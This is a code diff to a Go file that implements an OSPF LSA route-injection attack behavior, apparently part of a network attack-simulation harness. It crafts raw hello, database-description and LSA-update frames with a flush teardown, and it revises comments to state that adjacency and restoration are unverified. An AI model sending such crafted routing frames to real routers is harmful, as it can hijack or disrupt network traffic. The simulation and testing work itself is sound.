@@ -1,28 +1,6 @@
-// ospf.go implements the OSPF LSA injection attack behavior.
-//
-// Durability (from the catalog): temporary-restored. The attack forms an
-// adjacency with the target router (hello → database description → LSA
-// update), then arms a flush teardown: send a MaxSeq LSA flush (LSAge=3600,
-// Seq=0x80000001) followed by a goodbye (an OSPF hello listing the target
-// as a neighbor with no neighbors of our own, driving adjacency reset).
-// The teardown is armed before the first frame.
-//
-// OSPF PDU paths:
-//   - Hello: raw craft (fork has decode but no SerializeTo for OSPFv2).
-//   - Database Description: raw craft.
-//   - Link State Update (LSA inject): raw craft.
-//   - LSA flush (teardown): raw craft.
-//   - Goodbye hello (teardown): raw craft.
-//
-// The gopacket fork's OSPF types (OSPFv2, OSPFType, HelloPkgV2, LSUpdate,
-// LSAheader, etc.) are used for DECODE on the RX path where they exist;
-// all TX uses raw craft because the fork provides no SerializeTo for any
-// OSPF PDU type.
-//
-// Nakibly fight-back evasion: the injection sequence respects inter-packet
-// timing (the in-memory harness makes the ordering observable) and is
-// aware of triggered-update behavior — the flush uses a MaxSeq number to
-// override any existing LSA, matching the fight-back evasion reference.
+// OSPF models a fixed hello, database-description, and LSA-update sequence.
+// The runner executes the armed flush and goodbye frames after the behavior
+// returns. Packet bytes are fixture data; adjacency and restoration are unverified.
 
 package routing
 
@@ -30,7 +8,9 @@ import (
 	"context"
 	"encoding/binary"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"net"
 	"time"
 
@@ -59,22 +39,24 @@ type ospfFinding struct {
 	Restore   string `json:"restore"`
 }
 
-// RunOSPF performs the OSPF LSA injection lifecycle: hello → adjacency →
-// LSA inject, with a flush+goodbye teardown armed before the first frame.
+// RunOSPF sends the fixture's hello, database description, and LSA update,
+// with a flush and goodbye teardown armed before the first frame.
 //
-// The in-memory test shape (scripted stimulus from the FRR-shaped fixture):
-// the behavior sends a hello, receives the target's hello response (fed via
-// PushRX), sends a database description, receives the target's DB desc,
-// sends the LSA update (injected route), then returns. The teardown sends
-// a flush LSA (MaxSeq, LSAge=3600) and a goodbye hello.
+// It requires runner-provided dependencies. A missing hello is tolerated
+// after 100 ms; a receive or decode failure stops the sequence. Cancellation
+// returns ctx.Err(). Findings describe transmitted frames, not a confirmed
+// adjacency. Concurrent calls require separate dependencies.
 func RunOSPF(ctx context.Context, deps runner.Deps) error {
+	if err := ctx.Err(); err != nil {
+		return err
+	}
 	src := srcMAC()
 	routerID := attackerRouterID
 	areaID := uint32(0) // backbone area 0.0.0.0
 
 	// Arm the teardown before the first frame.
 	// Teardown step 1 (least-dependent): flush the injected LSA with a
-	// MaxSeq number and LSAge=3600 so the target removes it from its LSDB.
+	// matching sequence and LSAge=3600. Removal is not verified.
 	flushPkt, err := craftLSAFlush(src, routerID, areaID)
 	if err != nil {
 		return fmt.Errorf("ospf: craft flush: %w", err)
@@ -99,6 +81,9 @@ func RunOSPF(ctx context.Context, deps runner.Deps) error {
 		return fmt.Errorf("ospf: craft hello: %w", err)
 	}
 	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
+		if ctx.Err() != nil {
+			return ctx.Err()
+		}
 		return fmt.Errorf("ospf: send hello: %w", err)
 	}
 
@@ -107,8 +92,14 @@ func RunOSPF(ctx context.Context, deps runner.Deps) error {
 	// a short timeout — in the in-memory harness, a missing RX frame is
 	// not fatal; the behavior proceeds with the inject.
 	rxCtx, rxCancel := context.WithTimeout(ctx, 100*time.Millisecond)
-	_, _ = recvOSPF(rxCtx, deps.AttackLeg)
+	_, rxErr := recvOSPF(rxCtx, deps.AttackLeg)
 	rxCancel()
+	if err := ctx.Err(); err != nil {
+		return err
+	}
+	if rxErr != nil && !errors.Is(rxErr, context.DeadlineExceeded) {
+		return rxErr
+	}
 
 	// Phase 3: Database Description.
 	dbDescPkt, err := craftDBDesc(src, routerID, areaID)
@@ -116,16 +107,22 @@ func RunOSPF(ctx context.Context, deps runner.Deps) error {
 		return fmt.Errorf("ospf: craft db desc: %w", err)
 	}
 	if err := deps.AttackLeg.Send(ctx, dbDescPkt); err != nil {
+		if ctx.Err() != nil {
+			return ctx.Err()
+		}
 		return fmt.Errorf("ospf: send db desc: %w", err)
 	}
 
 	// Phase 4: LSA Update (inject route).
-	injectSeq := uint32(0x80000001) // MaxSeq start
+	injectSeq := uint32(0x80000001) // Fixture sequence
 	lsaUpdatePkt, err := craftLSAUpdate(src, routerID, areaID, injectSeq)
 	if err != nil {
 		return fmt.Errorf("ospf: craft lsa update: %w", err)
 	}
 	if err := deps.AttackLeg.Send(ctx, lsaUpdatePkt); err != nil {
+		if ctx.Err() != nil {
+			return ctx.Err()
+		}
 		return fmt.Errorf("ospf: send lsa update: %w", err)
 	}
 
@@ -148,16 +145,18 @@ func RunOSPF(ctx context.Context, deps runner.Deps) error {
 // recvOSPF reads one frame from the leg and attempts to decode it as an
 // OSPF packet. Returns the decoded OSPFv2 layer, or an error if no frame
 // arrives or the decode fails.
-//
-// harness may not feed a response.
-//
-//nolint:unused // documents the RX path for production; the in-memory
 func recvOSPF(ctx context.Context, leg link.Leg) (*layers.OSPFv2, error) {
 	ch := leg.Receive(ctx)
 	select {
 	case f, ok := <-ch:
-		if !ok || f.Err != nil {
-			return nil, fmt.Errorf("ospf: rx channel closed")
+		if err := ctx.Err(); err != nil {
+			return nil, err
+		}
+		if !ok {
+			return nil, fmt.Errorf("ospf: receive: %w", io.EOF)
+		}
+		if f.Err != nil {
+			return nil, fmt.Errorf("ospf: receive: %w", f.Err)
 		}
 		// Decode: skip Ethernet + IPv4 to reach OSPF payload.
 		pkt := gopacket.NewPacket(f.Data, layers.LayerTypeEthernet, gopacket.Default)
@@ -183,8 +182,7 @@ func craftOSPFHello(src net.HardwareAddr, routerID, areaID uint32, neighbors []u
 	// PacketLength: set after body
 	binary.BigEndian.PutUint32(hdr[4:8], routerID)
 	binary.BigEndian.PutUint32(hdr[8:12], areaID)
-	// Checksum at [12:14] — left 0; in production the fork computes it,
-	// but OSPF checksums are not validated by the in-memory harness.
+	// The fixture leaves the OSPF checksum zero; the harness does not validate it.
 	// AuType=0, Authentication=0 (no auth) at [14:24].
 
 	// Hello body
@@ -325,8 +323,8 @@ func craftLSAUpdate(src net.HardwareAddr, routerID, areaID, seq uint32) ([]byte,
 }
 
 // craftLSAFlush builds an OSPFv2 Link State Update carrying one router-LSA
-// with LSAge=3600 (maxAge) and MaxSeq, which causes the target to flush the
-// LSA from its LSDB. This is the teardown step.
+// with LSAge=3600 and the fixture sequence number. The runner sends this
+// during teardown; no acknowledgment or LSDB state is checked.
 func craftLSAFlush(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) {
 	hdr := make([]byte, ospfHeaderLen)
 	hdr[0] = 2
@@ -337,14 +335,14 @@ func craftLSAFlush(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error
 	body := make([]byte, 4)
 	binary.BigEndian.PutUint32(body, 1) // 1 LSA
 
-	// Flush LSA: LSAge=3600 (maxAge), MaxSeq
+	// Flush LSA: LSAge=3600 and the fixture sequence.
 	lsaHeader := make([]byte, ospfLSAHeaderLen)
 	binary.BigEndian.PutUint16(lsaHeader[0:2], 3600) // maxAge
 	lsaHeader[2] = 0x02
 	lsaHeader[3] = byte(layers.RouterLSAtypeV2)
 	binary.BigEndian.PutUint32(lsaHeader[4:8], routerID)
 	binary.BigEndian.PutUint32(lsaHeader[8:12], routerID)
-	binary.BigEndian.PutUint32(lsaHeader[12:16], 0x80000001)       // MaxSeq
+	binary.BigEndian.PutUint32(lsaHeader[12:16], 0x80000001)       // Fixture sequence
 	binary.BigEndian.PutUint16(lsaHeader[18:20], ospfLSAHeaderLen) // length = header only
 
 	body = append(body, lsaHeader...)
